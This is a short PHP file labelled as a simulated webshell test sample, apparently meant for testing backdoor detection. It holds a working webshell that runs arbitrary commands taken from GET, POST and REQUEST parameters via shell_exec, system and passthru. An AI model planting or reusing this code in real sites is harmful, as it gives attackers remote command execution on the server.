<?php
/**
 * TEST FILE - SIMULATED WEBSHELL #1
 * Classic PHP backdoor with command execution
 * 
 * DANGER: This is for testing purposes only!
 */

// Simple command execution backdoor
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}

// Alternative using system()
if(isset($_POST['exec'])) {
    system($_POST['exec']);
}

// Passthru variant
if(isset($_REQUEST['run'])) {
    passthru($_REQUEST['run']);
}
?>
